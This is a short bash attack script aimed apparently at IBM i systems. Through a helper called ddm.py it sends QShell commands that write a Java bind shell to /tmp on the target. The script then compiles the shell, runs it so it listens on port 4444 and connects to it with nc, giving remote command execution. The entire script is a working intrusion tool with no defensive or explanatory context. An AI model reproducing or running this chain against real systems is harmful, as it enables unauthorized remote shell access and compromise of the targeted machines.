#!/bin/bash

echo [+] Sending the payload...
python3 ./ddm.py $1 "STRQSH CMD('echo ''import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.io.PrintWriter;import java.net.ServerSocket;import java.net.Socket;public class Bindshell {           public static void main(String[] args) throws IOException, InterruptedException {            ServerSocket server = null;        server = new ServerSocket(4444);    Socket  client = server.accept();    InputStreamReader in = new InputStreamReader( client.getInputStream());    BufferedReader bri = new BufferedReader(in);    PrintWriter out  = new PrintWriter(client.getOutputStream(), true);    String str = \"\";        while (!str.matches(\"exit\")) {        str = bri.readLine();        String[] cmd = {\"/bin/sh\",\"-c\",str};        Process p = Runtime.getRuntime().exec(cmd);                InputStreamReader i = new InputStreamReader( p.getInputStream(), \"cp500\");        BufferedReader br = new BufferedReader(i);        String line;        while ((line = br.readLine()) != null) {            out.println(line);            }      }    in.close();    out.close();    client.close();}}'' >/tmp/Bindshell.java')"
echo [+] Compiling...
python3 ./ddm.py $1 "STRQSH CMD('javac -encoding IBM-1025 -d /tmp/ /tmp/Bindshell.java')"
sleep 2
echo [+] Bindshell on port 4444
python3 ./ddm.py $1 "STRQSH CMD('java -cp /tmp Bindshell')"
sleep 2
nc -v $1 4444